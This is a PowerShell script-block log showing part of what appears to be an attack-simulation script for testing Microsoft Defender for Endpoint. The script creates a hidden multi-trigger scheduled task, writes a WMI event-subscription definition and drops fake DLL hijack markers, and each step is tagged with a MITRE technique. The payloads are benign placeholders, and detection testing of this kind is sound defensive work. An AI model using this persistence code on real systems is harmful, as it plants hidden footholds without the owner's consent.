    Write-MDELog ""Creating advanced scheduled task persistence"" ""PERSIST"" -Technique ""T1053.005"" -Severity 4
    
    $taskName = ""MDE_Advanced_Test_$($script:AttackID.Substring(0,8))""
    
    # Create task with multiple triggers
    $action = New-ScheduledTaskAction -Execute ""cmd.exe"" -Argument ""/c echo MDE Test && pause""
    $triggers = @(
        (New-ScheduledTaskTrigger -Daily -At ""3:00AM""),
        (New-ScheduledTaskTrigger -AtLogOn),
        (New-ScheduledTaskTrigger -AtStartup)
    )
    $principal = New-ScheduledTaskPrincipal -UserId ""$env:USERDOMAIN\$env:USERNAME"" -LogonType Interactive
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    
    try {
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $triggers -Principal $principal -Settings $settings -Force | Out-Null
        Write-MDELog ""Advanced scheduled task created: $taskName"" ""PERSIST""
    } catch {
        Write-MDELog ""Failed to create scheduled task"" ""ERROR""
    }
    
    # T1546.003 - WMI Event Subscription
    Write-MDELog ""Creating WMI event subscription persistence"" ""PERSIST"" -Technique ""T1546.003"" -Severity 5
    
    $filterName = ""MDETestFilter_$($script:AttackID.Substring(0,8))""
    $consumerName = ""MDETestConsumer_$($script:AttackID.Substring(0,8))""
    
    # Create WMI persistence indicators
    $wmiPersistence = @{
        FilterName = $filterName
        ConsumerName = $consumerName
        FilterQuery = ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""
        ConsumerScript = ""powershell.exe -NoProfile -Command Write-EventLog -LogName Application -Source WSH -EventId 1 -Message 'WMI Test'""
        Namespace = ""root\subscription""
        Timestamp = Get-Date -Format ""o""
    }
    
    $wmiPersistence | ConvertTo-Json | Out-File ""$TargetPath\wmi_persistence_advanced.json""
    
    # T1574.001 - DLL Search Order Hijacking simulation
    Write-MDELog ""Simulating DLL hijacking setup"" ""PERSIST"" -Technique ""T1574.001"" -Severity 4
    
    $hijackLocations = @(
        ""$env:TEMP\version.dll"",
        ""$env:TEMP\mscoree.dll"",
        ""$env:TEMP\cryptsp.dll""
    )
    
    foreach ($dll in $hijackLocations) {
        # Create fake DLL marker
        ""MZ`u{0}`u{0}This program cannot be run in DOS mode."" | Out-File $dll -Encoding ASCII
        Write-MDELog ""Created hijack marker: $dll"" ""PERSIST""
    }
    
    # T1547.009 - Shortcut Modification
    Write-MDELog ""Creating malicious shortcuts"" ""PERSIST"" -Technique ""T1547.009"" -Severity 3

ScriptBlock ID: 7079c0a7-864c-4409-8206-1982720c61a3
Path: C:\Simulation_Scripts\MDE_Attack_Simulation.ps1"
